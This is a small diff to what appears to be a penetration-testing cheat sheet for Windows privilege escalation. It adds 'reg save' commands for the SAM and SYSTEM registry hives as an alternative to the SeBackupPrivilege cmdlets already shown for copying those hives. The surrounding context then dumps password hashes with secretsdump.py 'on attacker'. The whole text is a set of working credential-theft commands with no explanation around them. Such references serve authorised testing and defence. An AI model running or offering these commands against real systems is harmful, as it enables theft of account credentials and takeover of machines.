@@ -1462,6 +1462,10 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\Temp\sam -Overwrite
 Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\Temp\system -Overwrite
 
+or
+reg save hklm\sam sam
+reg save hklm\system system
+
 # Dump on attacker
 secretsdump.py -sam sam -system system LOCAL
 ```
